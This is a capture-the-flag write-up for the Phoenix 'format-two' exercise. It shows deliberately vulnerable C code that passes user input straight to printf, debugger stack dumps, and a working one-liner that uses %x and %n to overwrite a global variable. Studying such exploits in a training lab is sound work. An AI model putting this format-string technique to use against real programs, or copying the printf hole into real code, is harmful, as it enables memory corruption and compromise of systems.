# Challenge Source Code
```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
"Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
    printf(str);
}

int main(int argc, char **argv) {
    char buf[256];

    printf("%s\n", BANNER);

    if (argc > 1) {
        memset(buf, 0, sizeof(buf));
        strncpy(buf, argv[1], sizeof(buf));
        bounce(buf);
    }

    if (changeme != 0) {
        puts("Well done, the 'changeme' variable has been changed correctly!");
    } else {
        puts("Better luck next time!\n");
    }

    exit(0);
}
```
# Challenge Theory
This challenge is extremely similar to other fmt string challenges, except for the fact that instead of a stack value, it is now a global variable which must be changed.
After taking a look at a debugger, the "changeme" variable is located at the memory address 0x600af0.
This value is not conviently close to the stack, therefore modifying that specific value in memory must be modified directly instead of overflowing the stack like other vulns. 
# Working on the Challenge
Taking a look at the code, it is a printf vuln letting the attacker do whatever they want.
Here, the goal is to change "changeme" variable.
The first thing the attacker needs is the memory address where the printf will start reading, and where the user input actually ends up in the stack.
To do this, some "%x" flags and some "A" characters will be used.
Using the input and running the program with:
```
./format-two %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAAAAAAAA
```
Will produce the following output:
```
0d00ffffe570ffffe4ffffffe540ffffe540ffffe640400705ffffe698400368782578257825782578257825782578257825782541414141000AAA
AAAAABetter luck next time!
```
There are few things to note.
The actual value that is wanted to be controlled is put after the "%x".
This is important for actually overwriting the "changeme" variable in memory.
Some other data which is fairly useful for creating an exploit would be the stack view after execution of the printf function.
Stack view after execution:
```
gef➤  x/32gx $rsp
0x7fffffffe4e0: 0x00007fffffffe648      0x0000000200400368
0x7fffffffe4f0: 0x7825782578257825      0x7825782578257825
0x7fffffffe500: 0x7825782578257825      0x7825782578257825
0x7fffffffe510: 0x7825782578257825      0x4141414141414141
0x7fffffffe520: 0x0000000000000000      0x0000000000000000
0x7fffffffe530: 0x0000000000000000      0x0000000000000000
0x7fffffffe540: 0x0000000000000000      0x0000000000000000
0x7fffffffe550: 0x0000000000000000      0x0000000000000000
0x7fffffffe560: 0x0000000000000000      0x0000000000000000
0x7fffffffe570: 0x0000000000000000      0x0000000000000000
0x7fffffffe580: 0x0000000000000000      0x0000000000000000
0x7fffffffe590: 0x0000000000000000      0x0000000000000000
0x7fffffffe5a0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5b0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5c0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5d0: 0x0000000000000000      0x0000000000000000
```
Another thing that is needed is the actual address of the "changeme" variable.
To gather this data a simple objdump will be performed.
The objdump command used:
```
objdump -t /opt/phoenix/amd64/format-two | grep "changeme"
0000000000600af0 g     O .bss   0000000000000004 changeme
```
With all of these things in mind it is time to write the final exploit.
# Creating the Final Exploit
To actually write the exploit the "%n" flag will be used.
This will allow the exploit to write to arbitrary memory and not overwriting stack values.
The final exploit is a simple one-liner:
```
/opt/phoenix/amd64/format-two $'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n\xf0\x0a\x60'
```
There are many things to note here.
The first thing to note is the string substition of the actual payload.
This just makes sure the all of the bad characters get encoded into memory properly.
After this, there is the actual exploit string.
Here there are 15 "%x"'s.
This is because they allow for a stack aligned argument for the "%n" flag.
Following the "%n" with it's argument which is the memory of the place to write to creates the exploit.
To illustrate this further, here is a stack view:
```
gef➤  x/12gx $rsp
0x7fffffffe4f0: 0x00007fffffffe658      0x0000000200400368
0x7fffffffe500: 0x7825782578257825      0x7825782578257825
0x7fffffffe510: 0x7825782578257825      0x6e25782578257825
0x7fffffffe520: 0x0000000000600af0      0x0000000000000000
0x7fffffffe530: 0x0000000000000000      0x0000000000000000
0x7fffffffe540: 0x0000000000000000      0x0000000000000000
```
